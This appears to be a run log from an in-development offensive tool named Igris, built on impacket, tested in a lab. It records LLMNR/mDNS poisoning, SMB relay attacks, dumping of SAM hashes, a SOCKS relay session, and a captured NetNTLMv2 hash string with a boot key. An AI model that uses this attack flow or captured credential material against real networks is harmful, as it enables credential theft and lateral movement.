+2021-11-26 10:21:33.941 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-26 10:21:33.958 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-8: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-26 10:21:34.085 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-26 10:21:34.130 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-26 10:21:34.987 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-26 10:21:35.020 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-26 10:21:35.460 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-26 10:21:36.010 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-26 10:21:37.360 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-26 10:21:37.565 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-11-26 10:21:48.126 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-26 10:36:34.200 | WARNING  | project.ManInTheMiddle.maninthemiddle:__file_exits:432 - The file will be overwrite, do you want to continue ?(press 'y' to continue but any)
+2021-11-26 10:36:35.093 | INFO     | project.ManInTheMiddle.maninthemiddle:__checking_conditions_for_attack:486 - Exiting ...
+2021-11-26 10:40:23.836 | WARNING  | project.ManInTheMiddle.maninthemiddle:__file_exits:432 - The file will be overwrite, do you want to continue ?(press 'y' to continue but any)
+2021-11-26 10:44:30.545 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:531 - Running ntlm relay in the background the results will be saved at: /home/rsgbengi/Igris/192.168.253.129_samhashes.sam 
+2021-11-26 10:44:30.573 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:117 - Starting smb-relay server...
+2021-11-26 10:44:30.611 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-26 10:44:47.973 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_ntlm_relay:553 - Finishing ntlm relay attack in the background ...
+2021-11-26 10:45:17.510 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:531 - Running ntlm relay in the background the results will be saved at: /home/rsgbengi/Igris/192.168.253.129_samhashes.sam 
+2021-11-26 10:45:17.529 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:117 - Starting smb-relay server...
+2021-11-26 10:45:17.537 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-26 10:45:56.552 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-26 10:45:56.639 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-26 10:45:56.657 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-26 10:45:56.753 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-26 10:45:56.803 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-26 10:45:57.937 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-26 10:45:58.042 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-26 10:45:58.894 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-26 10:45:58.900 | INFO     | impacket.examples.secretsdump:finish:725 - Stopping service RemoteRegistry
+2021-11-26 10:47:16.609 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_ntlm_relay:553 - Finishing ntlm relay attack in the background ...
+2021-11-26 10:49:22.498 | WARNING  | project.ManInTheMiddle.maninthemiddle:__file_exits:432 - The file will be overwrite, do you want to continue ?(press 'y' to continue but any)
+2021-11-26 10:49:24.096 | INFO     | project.ManInTheMiddle.servers.proxyserver:__init__:11 - Starting socks server ...
+2021-11-26 10:49:24.145 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-26 10:49:24.146 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-26 10:49:24.152 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-26 10:49:30.095 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-26 10:49:33.292 | WARNING  | project.ManInTheMiddle.maninthemiddle:__file_exits:432 - The file will be overwrite, do you want to continue ?(press 'y' to continue but any)
+2021-11-26 10:49:34.476 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:531 - Running ntlm relay in the background the results will be saved at: /home/rsgbengi/Igris/192.168.253.129_samhashes.sam 
+2021-11-26 10:49:34.484 | INFO     | project.ManInTheMiddle.servers.proxyserver:__init__:11 - Starting socks server ...
+2021-11-26 10:49:34.545 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:117 - Starting smb-relay server...
+2021-11-26 10:49:34.555 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-26 10:49:48.866 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-12: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-26 10:50:07.355 | ERROR    | impacket.examples.ntlmrelayx.servers.smbrelayserver:init_client:796 - SMBClient error: Connection was reset
+2021-11-26 10:50:08.374 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-15: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-26 10:50:11.450 | ERROR    | impacket.examples.ntlmrelayx.servers.smbrelayserver:init_client:796 - SMBClient error: Connection was reset
+2021-11-26 10:50:35.274 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-17: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-26 10:50:38.331 | ERROR    | impacket.examples.ntlmrelayx.servers.smbrelayserver:init_client:796 - SMBClient error: Connection was reset
+2021-11-26 10:50:46.213 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-18: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-26 10:50:49.275 | ERROR    | impacket.examples.ntlmrelayx.servers.smbrelayserver:init_client:796 - SMBClient error: Connection was reset
+2021-11-26 10:51:03.366 | WARNING  | project.ManInTheMiddle.maninthemiddle:__file_exits:432 - The file will be overwrite, do you want to continue ?(press 'y' to continue but any)
+2021-11-26 10:51:12.095 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:531 - Running ntlm relay in the background the results will be saved at: /home/rsgbengi/Igris/192.168.253.129_samhashes.sam 
+2021-11-26 10:51:12.107 | INFO     | project.ManInTheMiddle.servers.proxyserver:__init__:11 - Starting socks server ...
+2021-11-26 10:51:12.161 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:117 - Starting smb-relay server...
+2021-11-26 10:51:12.169 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-26 10:51:18.914 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-11: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-26 10:51:21.979 | ERROR    | impacket.examples.ntlmrelayx.servers.smbrelayserver:init_client:796 - SMBClient error: Connection was reset
+2021-11-26 10:51:24.028 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-12: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-26 10:51:25.051 | ERROR    | impacket.examples.ntlmrelayx.servers.smbrelayserver:init_client:796 - SMBClient error: Connection was reset
+2021-11-26 10:51:58.522 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_ntlm_relay:553 - Finishing ntlm relay attack in the background ...
+2021-11-26 10:53:32.242 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:124 - Running mss the results will be saved in : /home/rsgbengi/Igris
+2021-11-26 10:53:32.247 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-26 10:53:32.248 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
+2021-11-26 10:53:32.250 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-11-26 10:53:32.251 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-11-26 10:53:32.251 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-11-26 10:53:49.438 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-26 10:53:49.472 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-26 10:53:50.441 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.130,50024)
+2021-11-26 10:53:50.457 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
+2021-11-26 10:53:50.457 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BENJI\benji authenticated successfully
+2021-11-26 10:53:50.460 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:63d59934f7ce275e85e180de80161c26:0101000000000000003304e5b3e2d7012305120217e60ee200000000010010006b005500420079004d006c0072007500030010006b005500420079004d006c0072007500020010005700610057005a007100730048004f00040010005700610057005a007100730048004f0007000800003304e5b3e2d70106000400020000000800300030000000000000000000000000200000f6cc09d49d3b11645d0a3b74dbc87e154c8d5f8d7dfeaaf855a01cf45fddf0f10a001000000000000000000000000000000000000900340063006900660073002f006d006100640073006c006b0066006a006c0073006b00640066006a006b002e006c006f00630061006c000000000000000000
+2021-11-26 10:53:50.854 | INFO     | impacket.smbserver:NetrWkstaGetInfo:4534 - NetrWkstaGetInfo Level: 100
+2021-11-26 10:53:50.936 | INFO     | impacket.smbserver:NetrServerGetInfo:4624 - NetrServerGetInfo Level: 101
+2021-11-26 10:53:51.147 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2021-11-26 10:54:01.143 | INFO     | impacket.smbserver:smbComTreeDisconnect:1921 - Disconnecting Share(1:IPC$)
+2021-11-26 10:54:01.150 | INFO     | impacket.smbserver:finish:3798 - Closing down connection (192.168.253.130,50024)
+2021-11-26 10:54:01.151 | INFO     | impacket.smbserver:removeConnection:3946 - Remaining connections []
+2021-11-26 10:54:07.070 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:115 - Exiting smb relay attack ...
+2021-11-26 11:05:28.250 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:531 - Running ntlm relay in the background the results will be saved at: /home/rsgbengi/Igris/192.168.253.129_samhashes.sam 
+2021-11-26 11:05:28.266 | INFO     | project.ManInTheMiddle.servers.proxyserver:__init__:11 - Starting socks server ...
+2021-11-26 11:05:28.367 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:117 - Starting smb-relay server...
+2021-11-26 11:05:28.380 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-26 11:05:44.786 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-12: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-26 11:05:44.982 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-26 11:05:44.992 | INFO     | threading:run:892 - SOCKS: Adding RSGBENGICORP/BENJI@192.168.253.129(445) to active SOCKS connection. Enjoy
+2021-11-26 11:05:44.995 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-12: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-26 11:05:52.898 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-14: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-27 19:09:47.408 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-27 19:09:47.414 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-27 19:09:47.538 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-27 19:09:56.597 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-27 19:09:56.636 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-27 19:09:57.570 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-27 19:09:57.603 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-27 19:09:57.828 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-27 19:09:58.924 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-27 19:09:58.936 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-7: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-27 19:09:59.048 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Service RemoteRegistry is in stopped state
+2021-11-27 19:09:59.068 | INFO     | impacket.examples.secretsdump:enableRegistry:682 - Starting service RemoteRegistry
+2021-11-27 19:10:00.082 | ERROR    | threading:_bootstrap_inner:954 - SMB SessionError: STATUS_PIPE_NOT_AVAILABLE(An instance of a named pipe cannot be found in the listening state.)
+2021-11-27 19:10:28.962 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-27 19:10:28.995 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-27 19:10:29.986 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-9: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-27 19:10:34.582 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-27 19:10:39.338 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:197 - Starting mdns poisoning...
+2021-11-27 19:10:39.339 | INFO     | project.ManInTheMiddle.servers.smbserver:start_smb_relay_server:120 - Starting smb-relay server...
+2021-11-27 19:10:39.378 | INFO     | threading:_bootstrap_inner:954 - Setting up SMB Server
+2021-11-27 19:10:54.069 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to 192.168.253.130[0m
+2021-11-27 19:10:54.103 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:158 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
+2021-11-27 19:10:55.127 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-8: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, attacking target smb://192.168.253.129
+2021-11-27 19:10:55.198 | INFO     | impacket.smbserver:processRequest:4319 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/BENJI SUCCEED
+2021-11-27 19:10:55.213 | INFO     | impacket.smbserver:processRequest:4319 - SMBD-Thread-8: Connection from RSGBENGICORP/BENJI@192.168.253.130 controlled, but there are no more targets left!
+2021-11-27 19:10:55.462 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:107 - Target system bootKey: 0xa914c891db39b6910864254739800e33
+2021-11-27 19:10:55.990 | INFO     | impacket.examples.ntlmrelayx.attacks.smbattack:run:111 - Dumping local SAM hashes (uid:rid:lmhash:nthash)
+2021-11-27 19:10:56.936 | INFO     | threading:_bootstrap_inner:954 - Done dumping SAM hashes for host: 192.168.253.129
+2021-11-27 19:10:59.585 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:391 - Exiting smb relay attack ...
+2021-11-28 17:35:59.718 | INFO     | project.igris:show_settable_variables_necessary:225 - Showing necessary settable variables
+2021-11-28 17:36:14.197 | INFO     | project.igris:show_settable_variables_necessary:225 - Showing necessary settable variables
+2021-11-28 17:44:11.916 | INFO     | project.igris:show_settable_variables_necessary:225 - Showing necessary settable variables
+2021-11-30 17:39:52.350 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_llmnr_poisoning:382 - Starting llmnr poisoning...
+2021-11-30 17:39:52.351 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
+2021-11-30 17:39:52.429 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-11-30 17:39:52.430 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-11-30 17:39:52.431 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
